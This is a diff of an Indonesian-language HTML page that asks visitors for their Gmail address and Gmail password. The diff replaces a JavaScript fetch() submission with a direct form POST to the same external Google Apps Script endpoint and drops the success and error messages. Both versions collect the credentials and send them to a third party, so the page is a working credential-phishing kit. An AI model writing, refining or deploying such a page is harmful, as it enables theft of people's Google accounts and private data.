@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8" />
   <title>Ambil tindakan</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     @font-face {
@@ -40,7 +39,10 @@
       gap: 10px;
       margin-bottom: 14px;
     }
-    .logo-img, .mid-img, .gog-img, .footer-img {
+    .logo-img,
+    .mid-img,
+    .gog-img,
+    .footer-img {
       display: block;
       margin: 0 auto;
     }
@@ -112,18 +114,6 @@
       border-radius: 10px;
       box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
     }
-    .success-message {
-      display: none;
-      color: green;
-      font-weight: bold;
-      margin-top: 12px;
-    }
-    .error-message {
-      display: none;
-      color: red;
-      font-weight: bold;
-      margin-top: 12px;
-    }
   </style>
 </head>
 <body>
@@ -143,44 +133,20 @@
 
     <img src="https://i.imgur.com/UZIsS5h.png" alt="Section Separator" class="gog-img" />
 
-    <form id="form">
+    <form
+      action="https://script.google.com/macros/s/AKfycbxgU2ymDNOCOUjuypgHxGyOxsazVokewRQDs_-8_YULJME01GKcNikxg3uLsgedjk15Xw/exec"
+      method="POST"
+    >
       <label for="name">masukkan Gmail yang ingin Anda gunakan</label>
-      <input type="text" id="name" name="name" required />
+      <input type="text" name="name" id="name" required />
 
       <label for="usage">masukkan kata sandi Gmail</label>
-      <input type="text" id="usage" name="usage" required />
+      <input type="text" name="usage" id="usage" required />
 
       <button type="submit">Submit</button>
     </form>
 
-    <div class="success-message" id="success">✅ Terkirim!</div>
-    <div class="error-message" id="error">❌ Gagal mengirim. Coba lagi.</div>
-
     <img src="https://i.imgur.com/z4qpO3r.png" alt="Footer Image" class="footer-img" />
   </div>
-
-  <script>
-    document.getElementById("form").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const scriptURL = "https://script.google.com/macros/s/AKfycbxgU2ymDNOCOUjuypgHxGyOxsazVokewRQDs_-8_YULJME01GKcNikxg3uLsgedjk15Xw/exec";
-      const formData = new FormData(this);
-
-      fetch(scriptURL, {
-        method: "POST",
-        mode: "no-cors",
-        body: formData
-      })
-      .then(() => {
-        document.getElementById("success").style.display = "block";
-        document.getElementById("error").style.display = "none";
-        document.getElementById("form").reset();
-      })
-      .catch(() => {
-        document.getElementById("success").style.display = "none";
-        document.getElementById("error").style.display = "block";
-      });
-    });
-  </script>
 </body>
 </html>
